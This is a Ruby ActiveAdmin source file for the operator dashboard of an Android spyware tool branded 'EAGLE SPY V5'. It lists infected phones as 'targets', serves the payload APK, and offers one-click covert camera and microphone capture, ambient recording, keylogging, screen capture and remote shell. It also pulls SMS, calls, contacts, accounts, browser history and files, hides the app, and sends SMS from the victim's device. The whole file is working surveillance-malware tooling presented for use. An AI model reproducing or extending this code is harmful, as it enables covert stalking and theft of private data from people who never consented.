ActiveAdmin.register_page "Dashboard" do
  menu priority: 1, label: "⚡ Command Center"

  content title: "⚡ Command Center" do

    # ─── Particle Canvas Background ───
    div id: "particle-canvas"

    # ─── Toast Container ───
    div id: "toast-container", class: "toast-container"

    # ─── Command Palette Overlay (hidden by default) ───
    div id: "cmd-palette", class: "cmd-palette" do
      div class: "cmd-palette-backdrop"
      div class: "cmd-palette-modal" do
        div class: "cmd-palette-header" do
          span "⚡", class: "cmd-palette-icon"
          # input field rendered via JS
          div id: "cmd-palette-input-wrap"
        end
        div id: "cmd-palette-results", class: "cmd-palette-results"
        div class: "cmd-palette-footer" do
          span "↑↓ Navigate", class: "cmd-hint"
          span "↵ Select", class: "cmd-hint"
          span "Esc Close", class: "cmd-hint"
        end
      end
    end

    # ─── Command Bar (top bar) ───
    div class: "command-bar" do
      div class: "cmd-left" do
        div class: "eagle-title" do
          h1 do
            span "EAGLE", class: "title-glow"
            text_node "SPY"
          end
          span "V5", class: "version-badge"
        end
      end
      div class: "cmd-center" do
        div class: "cmd-search-wrap" do
          span "🔍", class: "search-icon"
          # Search input rendered via JS for command palette trigger
          div class: "cmd-search-placeholder", id: "cmd-search-trigger" do
            text_node "Search commands... "
            span "Ctrl+K", class: "shortcut-badge"
          end
        end
      end
      div class: "cmd-right" do
        # Quick stats in command bar
        devices = Smartphone.joins(:apk_installation)
                           .where("apk_installations.status = ?", "installed")
        span class: "cmd-stat" do
          span "📡"
          span devices.count.to_s, class: "cmd-stat-value"
        end
        a href: admin_ai_chat_path, class: "cmd-icon-btn", title: "AI Assistant" do
          text_node "🤖"
        end
      end
    end

    devices = Smartphone.joins(:apk_installation)
                       .where("apk_installations.status = ?", "installed")

    if devices.empty?
      # ─── Empty State ───
      div class: "empty-state" do
        div class: "empty-icon" do
          text_node "📡"
        end
        h2 "No Targets Acquired"
        para "Deploy the payload to begin surveillance operations."
        div class: "apk-link" do
          text_node "http://#{request.host}:#{request.port}/app-release.apk"
        end
      end
    else

      # ─── Metrics Deck ───
      total_devices = Smartphone.count
      total_keylogs = Keylog.count rescue 0
      total_sms = SmsMessage.count
      total_locations = GeoLocation.count
      total_photos = Picture.count
      total_recordings = Recording.count

      yesterday_start = 1.day.ago.beginning_of_day
      yesterday_end = 1.day.ago.end_of_day
      today_start = Time.current.beginning_of_day

      div class: "metrics-deck" do
        [
          ["📡", devices.count, "Devices", "cyan",
            devices.where("smartphones.updated_at >= ?", today_start).count,
            devices.where(smartphones: { updated_at: yesterday_start..yesterday_end }).count],
          ["⌨️", total_keylogs, "Keylogs", "purple",
            (Keylog.where("keylogs.created_at >= ?", today_start).count rescue 0),
            (Keylog.where(keylogs: { created_at: yesterday_start..yesterday_end }).count rescue 0)],
          ["💬", total_sms, "Messages", "green",
            SmsMessage.where("sms_messages.created_at >= ?", today_start).count,
            SmsMessage.where(sms_messages: { created_at: yesterday_start..yesterday_end }).count],
          ["📍", total_locations, "Locations", "amber",
            GeoLocation.where("geo_locations.created_at >= ?", today_start).count,
            GeoLocation.where(geo_locations: { created_at: yesterday_start..yesterday_end }).count],
          ["📸", total_photos, "Photos", "pink",
            Picture.where("pictures.created_at >= ?", today_start).count,
            Picture.where(pictures: { created_at: yesterday_start..yesterday_end }).count],
          ["🎙️", total_recordings, "Recordings", "red",
            Recording.where("recordings.created_at >= ?", today_start).count,
            Recording.where(recordings: { created_at: yesterday_start..yesterday_end }).count]
        ].each_with_index do |(icon, val, label, accent, today_count, yesterday_count), idx|
          div class: "metric-card", "data-accent": accent, style: "animation-delay: #{idx * 0.08}s" do
            div class: "metric-icon" do
              text_node icon
            end
            div class: "metric-body" do
              span val.to_s, class: "counter-value", "data-count": val
              div class: "stat-trend" do
                if today_count > yesterday_count
                  span "▲", class: "trend-arrow trend-up"
                  span "+#{today_count - yesterday_count}", class: "trend-text"
                elsif today_count < yesterday_count
                  span "▼", class: "trend-arrow trend-down"
                  span "#{today_count - yesterday_count}", class: "trend-text"
                else
                  span "━", class: "trend-arrow trend-flat"
                  span "stable", class: "trend-text"
                end
              end
              span label, class: "metric-label"
            end
          end
        end
      end

      # ─── Tactical Map Section ───
      div class: "tactical-map" do
        div class: "tactical-header" do
          span "🌐", class: "tactical-icon"
          span "TACTICAL MAP", class: "tactical-title"
          span "#{devices.count} targets", class: "tactical-count"
        end
        div id: "world-map", class: "map-container",
            "data-locations": (GeoLocation.select(:latitude, :longitude, :smartphone_id)
              .where(smartphone_id: devices.pluck(:id))
              .group(:smartphone_id)
              .having("geo_locations.id = MAX(geo_locations.id)")
              .limit(50)
              .map { |l| { lat: l.latitude, lng: l.longitude, id: l.smartphone_id } }
              .to_json rescue "[]")
      end

      # ─── Activity Timeline + System Health ───
      div class: "dashboard-panels" do
        # Activity Timeline
        div class: "panel-card timeline-panel" do
          div class: "panel-header" do
            span "⚡", class: "panel-icon"
            span "LIVE ACTIVITY", class: "panel-title"
          end
          div class: "timeline-list", id: "activity-timeline" do
            recent = PendingCommand.order(created_at: :desc).limit(15).includes(:smartphone)
            if recent.any?
              recent.each do |cmd|
                div class: "timeline-item" do
                  cmd_icon = case cmd.command
                    when /photo|picture|camera/ then "📸"
                    when /sms|message/ then "💬"
                    when /location|gps/ then "📍"
                    when /keylog/ then "⌨️"
                    when /shell|command/ then "💻"
                    when /record|audio|mic/ then "🎙️"
                    when /screen/ then "🖥️"
                    when /wifi/ then "📡"
                    when /device_info/ then "ℹ️"
                    when /social/ then "💭"
                    when /hide|show/ then "👻"
                    else "📌"
                  end
                  span cmd_icon, class: "timeline-icon"
                  div class: "timeline-content" do
                    span cmd.command.to_s.humanize, class: "timeline-action"
                    span (cmd.smartphone&.name || cmd.smartphone&.device_id || "Unknown"), class: "timeline-device"
                  end
                  time_text = cmd.created_at ? (time_ago_in_words(cmd.created_at) + " ago") : "—"
                  span time_text, class: "timeline-time"
                end
              end
            else
              div class: "empty-timeline" do
                text_node "No activity yet"
              end
            end
          end
        end

        # System Health
        div class: "panel-card health-panel" do
          div class: "panel-header" do
            span "🔋", class: "panel-icon"
            span "SYSTEM STATUS", class: "panel-title"
          end
          div class: "health-grid" do
            db_ok = begin; ActiveRecord::Base.connection.active?; rescue; false; end
            div class: "health-item #{db_ok ? 'healthy' : 'unhealthy'}" do
              span "", class: "health-dot"
              div class: "health-info" do
                span "Database", class: "health-name"
                span db_ok ? "Online" : "Down", class: "health-status"
              end
            end

            redis_ok = begin; Redis.new(url: ENV.fetch('REDIS_URL', 'redis://localhost:6379')).ping == 'PONG'; rescue; false; end
            div class: "health-item #{redis_ok ? 'healthy' : 'unhealthy'}" do
              span "", class: "health-dot"
              div class: "health-info" do
                span "Redis", class: "health-name"
                span redis_ok ? "Online" : "Offline", class: "health-status"
              end
            end

            cable_ok = defined?(ActionCable.server) && ActionCable.server.present?
            div class: "health-item #{cable_ok ? 'healthy' : 'unhealthy'}" do
              span "", class: "health-dot"
              div class: "health-info" do
                span "WebSocket", class: "health-name"
                span cable_ok ? "Active" : "Down", class: "health-status"
              end
            end

            div class: "health-item healthy" do
              span "", class: "health-dot"
              div class: "health-info" do
                span "Storage", class: "health-name"
                files_size = begin
                  size = Dir.glob(Rails.root.join('files', '**', '*')).sum { |f| File.size(f) rescue 0 }
                  "#{(size / 1024.0 / 1024).round(1)} MB"
                rescue
                  "N/A"
                end
                span files_size, class: "health-status"
              end
            end
          end
        end
      end

      # ─── Batch load per-device stats ───
      device_ids = devices.pluck(:id)
      device_stats = {
        keylogs: Keylog.where(smartphone_id: device_ids).group(:smartphone_id).count,
        sms: SmsMessage.where(smartphone_id: device_ids).group(:smartphone_id).count,
        photos: Picture.where(smartphone_id: device_ids).group(:smartphone_id).count,
        locations: GeoLocation.where(smartphone_id: device_ids).group(:smartphone_id).count,
        call_logs: CallLog.where(smartphone_id: device_ids).group(:smartphone_id).count,
        contacts: Contact.where(smartphone_id: device_ids).group(:smartphone_id).count,
        recordings: Recording.where(smartphone_id: device_ids).group(:smartphone_id).count,
      }

      # ─── Device Fleet Section ───
      div class: "fleet-header" do
        span "🎯", class: "fleet-icon"
        span "TARGET FLEET", class: "fleet-title"
        span "#{devices.count} active", class: "fleet-count"
      end

      devices.each_with_index do |device, dev_idx|
        div class: "device-card", style: "animation-delay: #{0.1 + dev_idx * 0.12}s" do
          # Header
          div class: "device-header" do
            div class: "device-avatar" do
              text_node raw('<svg viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="1.5"><rect x="5" y="2" width="14" height="20" rx="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>')
            end
            div class: "device-meta" do
              h3 device.name || "Unknown Device"
              span "#{device.operating_system || 'Android'} · #{device.device_id || '—'}", class: "device-os"
            end
            last_activity = device.updated_at
            is_recent = last_activity && (Time.current - last_activity) < 5.minutes
            div class: "device-status #{is_recent ? 'online' : 'offline'}" do
              span "", class: "pulse-dot"
              text_node is_recent ? "Online" : (last_activity ? "#{time_ago_in_words(last_activity)} ago" : "Unknown")
            end
          end

          # Tab Bar
          div class: "tab-bar" do
            [
              ["◉", "Surveillance"],
              ["◈", "Data"],
              ["◆", "Control"],
              ["◇", "Intel"]
            ].each_with_index do |(icon, label), i|
              cls = i == 0 ? "tab-btn active" : "tab-btn"
              button class: cls, id: "btn-#{device.id}-#{i}", onclick: "switchTab(this,'pane-#{device.id}-#{i}')" do
                span icon, class: "tab-icon"
                text_node label
              end
            end
          end

          # ─── TAB 0: Surveillance ───
          div class: "tab-pane active", id: "pane-#{device.id}-0" do
            span "LIVE FEEDS", class: "section-label"
            div class: "action-grid" do
              [
                [admin_live_streaming_path(device_id: device.id), "📹", "Live Camera", "c-red"],
                [admin_live_location_path(device_id: device.id), "📍", "Location", "c-green"],
                [admin_keylogs_path(q: { smartphone_id_eq: device.id }), "⌨️", "Keylogger", "c-cyan"],
                [admin_notifications_path(device_id: device.id), "🔔", "Alerts", "c-amber"],
                [admin_clipboard_monitor_path(device_id: device.id), "📋", "Clipboard", "c-blue"],
              ].each do |path, icon, label, cls|
                a href: path, class: "action-btn #{cls}" do
                  span icon, class: "action-icon"
                  span label, class: "action-label"
                end
              end
            end

            span "CAPTURE", class: "section-label"
            div class: "action-grid" do
              a href: take_picture_smartphones_path(smartphone_id: device.id), "data-method": "post", "data-remote": "true", class: "action-btn c-pink" do
                span "📸", class: "action-icon"
                span "Photo", class: "action-label"
              end
              a href: dump_screen_snap_screenshots_path(smartphone_id: device.id), "data-remote": "true", class: "action-btn c-purple" do
                span "🖥️", class: "action-icon"
                span "Screenshot", class: "action-label"
              end
              a href: screen_record_screenshots_path(smartphone_id: device.id, duration: 30), "data-method": "post", "data-remote": "true", class: "action-btn c-purple" do
                span "🎬", class: "action-icon"
                span "Screen Rec", class: "action-label"
              end
              a href: microphone_rec_recordings_path(smartphone_id: device.id, duration: 10), "data-method": "post", "data-remote": "true", class: "action-btn c-blue" do
                span "🎙️", class: "action-icon"
                span "Mic Rec", class: "action-label"
              end
              a href: ambient_record_smartphones_path(smartphone_id: device.id, duration: 60), "data-method": "post", "data-remote": "true", class: "action-btn c-cyan" do
                span "🌙", class: "action-icon"
                span "Ambient", class: "action-label"
              end
            end
          end

          # ─── TAB 1: Data ───
          div class: "tab-pane", id: "pane-#{device.id}-1" do
            span "COLLECTED INTEL", class: "section-label"
            div class: "action-grid" do
              [
                [admin_sms_messages_path(q: { smartphone_id_eq: device.id }), "💬", "SMS", "c-cyan"],
                [admin_call_logs_path(q: { smartphone_id_eq: device.id }), "📞", "Calls", "c-blue"],
                [admin_contacts_path(q: { smartphone_id_eq: device.id }), "👥", "Contacts", "c-purple"],
                [admin_pictures_path(q: { smartphone_id_eq: device.id }), "🖼️", "Gallery", "c-amber"],
                [admin_recordings_path(q: { smartphone_id_eq: device.id }), "🎵", "Audio", "c-pink"],
                [admin_social_media_messages_path(q: { smartphone_id_eq: device.id }), "💭", "Social", "c-green"],
                [admin_file_browser_path(device_id: device.id), "📁", "Files", "c-lime"],
              ].each do |path, icon, label, cls|
                a href: path, class: "action-btn #{cls}" do
                  span icon, class: "action-icon"
                  span label, class: "action-label"
                end
              end
            end

            span "EXTRACT", class: "section-label"
            div class: "action-grid" do
              a href: dump_device_info_smartphones_path(smartphone_id: device.id), "data-method": "post", "data-remote": "true", class: "action-btn c-green" do
                span "ℹ️", class: "action-icon"
                span "Device Info", class: "action-label"
              end
              a href: dump_wifi_info_smartphones_path(smartphone_id: device.id), "data-method": "post", "data-remote": "true", class: "action-btn c-blue" do
                span "📶", class: "action-icon"
                span "WiFi", class: "action-label"
              end
              a href: get_accounts_smartphones_path(smartphone_id: device.id), "data-method": "post", "data-remote": "true", class: "action-btn c-purple" do
                span "🔐", class: "action-icon"
                span "Accounts", class: "action-label"
              end
              a href: get_app_usage_smartphones_path(smartphone_id: device.id), "data-method": "post", "data-remote": "true", class: "action-btn c-amber" do
                span "📊", class: "action-icon"
                span "App Usage", class: "action-label"
              end
              a href: get_browser_history_smartphones_path(smartphone_id: device.id), "data-method": "post", "data-remote": "true", class: "action-btn c-cyan" do
                span "🌐", class: "action-icon"
                span "Browser", class: "action-label"
              end
            end
          end

          # ─── TAB 2: Control ───
          div class: "tab-pane", id: "pane-#{device.id}-2" do
            span "DEVICE CONTROL", class: "section-label"
            div class: "action-grid" do
              a href: run_shell_command_smartphones_path(smartphone_id: device.id), "data-method": "post", "data-remote": "true", class: "action-btn c-green" do
                span "💻", class: "action-icon"
                span "Shell", class: "action-label"
              end
              a href: list_apps_smartphones_path(smartphone_id: device.id), "data-method": "post", "data-remote": "true", class: "action-btn c-lime" do
                span "📱", class: "action-icon"
                span "Apps", class: "action-label"
              end
              a href: hide_app_smartphones_path(smartphone_id: device.id), "data-remote": "true", class: "action-btn c-purple" do
                span "👻", class: "action-icon"
                span "Hide", class: "action-label"
              end
              a href: show_app_smartphones_path(smartphone_id: device.id), "data-remote": "true", class: "action-btn c-blue" do
                span "👁️", class: "action-icon"
                span "Show", class: "action-label"
              end
              a href: toggle_wifi_smartphones_path(smartphone_id: device.id), "data-method": "post", "data-remote": "true", class: "action-btn c-cyan" do
                span "📡", class: "action-icon"
                span "WiFi", class: "action-label"
              end
              a href: wake_lock_smartphones_path(smartphone_id: device.id), "data-method": "post", "data-remote": "true", class: "action-btn c-amber" do
                span "🔓", class: "action-icon"
                span "Wake", class: "action-label"
              end
              a href: set_audio_mode_smartphones_path(smartphone_id: device.id, mode: 'silent'), "data-method": "post", "data-remote": "true", class: "action-btn c-red" do
                span "🔇", class: "action-icon"
                span "Silent", class: "action-label"
              end
              a href: send_sms_sms_messages_path(smartphone_id: device.id), "data-method": "post", "data-remote": "true", class: "action-btn c-pink" do
                span "📤", class: "action-icon"
                span "Send SMS", class: "action-label"
              end
            end
          end

          # ─── TAB 3: Intel (AI + Analytics merged) ───
          div class: "tab-pane", id: "pane-#{device.id}-3" do
            span "AI INTELLIGENCE", class: "section-label"
            div class: "action-grid" do
              a href: admin_ai_chat_path, class: "action-btn c-purple" do
                span "🤖", class: "action-icon"
                span "AI Chat", class: "action-label"
              end
              a href: admin_ai_analysis_path, class: "action-btn c-blue" do
                span "🧠", class: "action-icon"
                span "Analysis", class: "action-label"
              end
              a href: admin_ai_health_path, class: "action-btn c-green" do
                span "🔍", class: "action-icon"
                span "Health", class: "action-label"
              end
            end

            span "DEVICE ANALYTICS", class: "section-label"
            div class: "analytics-grid" do
              [
                ["⌨️", (device_stats[:keylogs][device.id] || 0), "Keylogs"],
                ["💬", (device_stats[:sms][device.id] || 0), "SMS"],
                ["📸", (device_stats[:photos][device.id] || 0), "Photos"],
                ["📍", (device_stats[:locations][device.id] || 0), "Locations"],
                ["📞", (device_stats[:call_logs][device.id] || 0), "Calls"],
                ["👥", (device_stats[:contacts][device.id] || 0), "Contacts"],
                ["🎙️", (device_stats[:recordings][device.id] || 0), "Audio"],
              ].each do |ico, val, lbl|
                div class: "analytic-card" do
                  span ico, class: "analytic-icon"
                  span val.to_s, class: "analytic-value"
                  span lbl, class: "analytic-label"
                end
              end
            end
          end

        end # device-card
      end # devices.each
    end # if/else

    # ─── Inline JavaScript ───
    script do
      text_node <<~JS.html_safe
        // Tab switching
        function switchTab(btn, paneId) {
          var card = btn.closest('.device-card');
          card.querySelectorAll('.tab-btn').forEach(function(b) { b.classList.remove('active'); });
          card.querySelectorAll('.tab-pane').forEach(function(p) { p.classList.remove('active'); });
          btn.classList.add('active');
          var pane = document.getElementById(paneId);
          if (pane) pane.classList.add('active');
        }

        // Toast
        window.showToast = function(message, type) {
          type = type || 'success';
          var container = document.getElementById('toast-container');
          if (!container) return;
          var icons = { success: '✅', error: '❌', pending: '⏳', warning: '⚠️' };
          var toast = document.createElement('div');
          toast.className = 'toast toast-' + type;
          toast.innerHTML = '<span class="toast-icon">' + (icons[type] || '📌') + '</span>' +
                            '<span class="toast-msg"></span>' +
                            '<div class="toast-progress"><div class="toast-progress-bar"></div></div>' +
                            '<button class="toast-close" onclick="this.parentElement.remove()">✕</button>';
          toast.querySelector('.toast-msg').textContent = message;
          container.appendChild(toast);
          setTimeout(function() { toast.classList.add('removing'); setTimeout(function() { toast.remove(); }, 300); }, 5000);
        };

        // AJAX response handling
        document.addEventListener('ajax:success', function(e) {
          var resp = e.detail && e.detail[0];
          if (resp && typeof resp === 'string' && resp.length < 200) {
            showToast(resp, 'success');
          } else {
            showToast('Command dispatched', 'success');
          }
        });
        document.addEventListener('ajax:error', function() {
          showToast('Command failed', 'error');
        });
      JS
    end

  end
end
